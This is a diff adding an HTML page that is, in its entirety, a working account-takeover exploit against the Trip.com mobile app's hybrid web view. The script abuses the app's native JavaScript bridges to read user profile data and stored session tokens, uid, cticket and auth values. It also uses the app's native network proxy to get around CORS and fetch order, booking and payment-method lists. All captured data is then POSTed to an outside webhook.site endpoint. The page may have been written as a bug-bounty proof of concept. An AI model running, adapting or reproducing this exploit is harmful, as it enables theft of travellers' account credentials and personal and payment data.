@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Trip.com - CRITICAL ATO v12 (Native Bridge Bypass)</title>
+    <style>
+      :root {
+        --bg: #0d1117;
+        --card: #161b22;
+        --red: #f85149;
+        --green: #3fb950;
+        --blue: #58a6ff;
+        --yellow: #e3b341;
+      }
+      body {
+        font-family: system-ui;
+        background: var(--bg);
+        color: #c9d1d9;
+        margin: 0;
+        padding: 20px;
+      }
+      h1 { color: var(--red); text-align: center; font-size: 28px; margin-bottom: 5px; }
+      .card { background: var(--card); border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+      .data-item { background: #000; border-left: 5px solid var(--green); padding: 12px; margin: 8px 0; border-radius: 4px; font-size: 13px; }
+      .data-item.critical { border-left-color: var(--red); background: #1a0000; }
+      .data-item.api { border-left-color: var(--blue); background: #000b1a; }
+      .status { padding: 8px 16px; border-radius: 8px; font-weight: bold; text-align: center; margin-bottom: 10px; }
+      .success { background: var(--green); color: #000; }
+      .info { background: var(--blue); color: #000; }
+      .warning { background: var(--yellow); color: #000; }
+      .console { background: #010409; padding: 12px; font-family: monospace; max-height: 300px; overflow-y: auto; font-size: 11px; border: 1px solid #30363d; }
+      pre { margin: 5px 0 0; white-space: pre-wrap; word-break: break-all; color: #7ee787; }
+      .badge { font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 10px; font-weight: bold; }
+      .badge.red { background: var(--red); color: white; }
+    </style>
+  </head>
+  <body>
+    <h1>TRIP.COM - CRITICAL ATO v12</h1>
+    <p style="text-align: center; color: #8b949e; margin-top: 0">
+      Using Native Network_a Proxy to Bypass CORS & Authenticate
+    </p>
+
+    <div class="card">
+      <div class="status info" id="status">Scanning Bridges...</div>
+      <div id="data"></div>
+    </div>
+
+    <div class="card">
+      <h3>Phase 2: Native API Exfiltration (Bypassing CORS)</h3>
+      <div id="api-data"></div>
+    </div>
+
+    <div class="card">
+      <h3>Execution Log</h3>
+      <div id="console" class="console"></div>
+    </div>
+
+    <script>
+      const webhook = "https://webhook.site/8014ecf0-c1ba-4310-a19b-83425639ca84";
+      let capturedData = {
+        meta: { version: "v12_NativeProxyBypass", timestamp: new Date().toISOString() },
+        credentials: { userInfo: "Waiting...", storage: {} },
+        api_results: {},
+        errors: []
+      };
+      let itemCount = 0;
+      let submissionTimer = null;
+
+      function log(m, t = "info") {
+        const d = document.createElement("div");
+        const color = t === "success" ? "#3fb950" : t === "error" ? "#f85149" : "#c9d1d9";
+        d.innerHTML = `[${new Date().toISOString().slice(11, 19)}] <span style="color:${color}">${m}</span>`;
+        document.getElementById("console").prepend(d);
+      }
+
+      function updateUI(containerId, k, v, isCrit = false) {
+        itemCount++;
+        const target = document.getElementById(containerId);
+        const div = document.createElement("div");
+        div.className = (isCrit ? "data-item critical" : "data-item") + (containerId === "api-data" ? " api" : "");
+        div.innerHTML = `<b>${k}</b>${isCrit ? '<span class="badge red">CRITICAL</span>' : ''}<pre>${typeof v === "object" ? JSON.stringify(v, null, 2) : v}</pre>`;
+        target.appendChild(div);
+        document.getElementById("status").innerText = `Stolen: ${itemCount} items`;
+      }
+
+      function finalSubmit() {
+        log("🚀 SUBMITTING ALL DATA VIA SINGLE POST...", "success");
+        document.getElementById("status").innerText = "SENT TO WEBHOOK";
+        document.getElementById("status").className = "status success";
+
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          mode: "no-cors",
+          body: JSON.stringify(capturedData),
+        }).then(() => log("🏁 EXPLOIT COMPLETE.", "success"));
+      }
+
+      window.__bridge_callback = function (base64) {
+        try {
+          const json = JSON.parse(atob(base64));
+          const tag = json.tagname || "unknown";
+          const d = json.param || json;
+          log(`✅ Callback: ${tag}`, "success");
+
+          if (tag === "user_info_exfil") {
+            capturedData.credentials.userInfo = d;
+            updateUI("data", "User Profile", d, true);
+          } else if (tag.startsWith("storage_")) {
+            const key = tag.split("_")[1];
+            capturedData.credentials.storage[key] = d.value;
+            updateUI("data", `Storage: ${key}`, d.value, true);
+          } else if (tag.startsWith("api_")) {
+            const name = tag.replace("api_", "");
+            capturedData.api_results[name] = d.body || d;
+            updateUI("api-data", `API: ${name}`, d.body || d, true);
+          }
+
+          clearTimeout(submissionTimer);
+          submissionTimer = setTimeout(finalSubmit, 7000);
+        } catch (e) {
+          log(`❌ Error: ${e.message}`, "error");
+        }
+      };
+
+      function hijackNativeAPI(name, url, body) {
+        if (!window.Network_a) return;
+        log(`📡 Firing Native Proxy: ${name}`, "warn");
+        const payload = JSON.stringify({
+          url: url,
+          method: "POST",
+          header: JSON.stringify({ "Content-Type": "application/json" }),
+          body: JSON.stringify(body),
+          timeout: 20000,
+          callback_tagname: "api_" + name
+        });
+        window.Network_a.sendRequestByProxy(payload);
+      }
+
+      window.onload = function () {
+        log("Phase 1: Token & Storage Exfiltration...");
+        document.getElementById("status").className = "status warning";
+
+        // 1. User Info
+        if (window.User_a) window.User_a.getUserInfo(JSON.stringify({ callback_tagname: "user_info_exfil" }));
+
+        // 2. Storage Dump (Try both User and Global methods)
+        if (window.IBUStorageV2_a) {
+          const keys = [
+            { b: "user", k: "userInfo" }, { b: "common", k: "token" }, 
+            { b: "common", k: "uid" }, { b: "common", k: "cticket" },
+            { b: "common", k: "auth" }, { b: "user", k: "bookingList" }
+          ];
+          keys.forEach((t, i) => {
+            setTimeout(() => {
+              const p = JSON.stringify({ callback_tagname: `storage_${t.k}`, bussiness: t.b, key: t.k });
+              window.IBUStorageV2_a.IBUGetUserValue(p);
+              window.IBUStorageV2_a.IBUGetGlobalValue(p);
+            }, i * 200);
+          });
+        }
+
+        // 3. Phase 2: Native Network Hijacking (Bypasses CORS)
+        setTimeout(() => {
+          log("Phase 2: Hijacking Native Network Proxy...", "success");
+          hijackNativeAPI("MyTrip_Stats_SOA26974", "//www.trip.com/restapi/soa2/26974/json/GetMemberOrderStatisticsWithBM", {
+            Channel: "IBUHybrid", Locale: "en-US",
+            OrderStatisticsGroups: [{ GroupName: "Upcoming" }, { GroupName: "Completed" }, { GroupName: "Cancelled" }]
+          });
+          
+          hijackNativeAPI("BookingList_SOA23196", "//www.trip.com/restapi/soa2/23196/json/getBookingList", {});
+          hijackNativeAPI("OrderList_SOA16845", "//www.trip.com/restapi/soa2/16845/json/getOrderList", { pageSize: 10, pageIndex: 1 });
+          hijackNativeAPI("PaymentMethods_SOA23196", "//www.trip.com/restapi/soa2/23196/json/getPaymentList", {});
+        }, 3000);
+
+        submissionTimer = setTimeout(finalSubmit, 15000);
+      };
+    </script>
+  </body>
+</html>
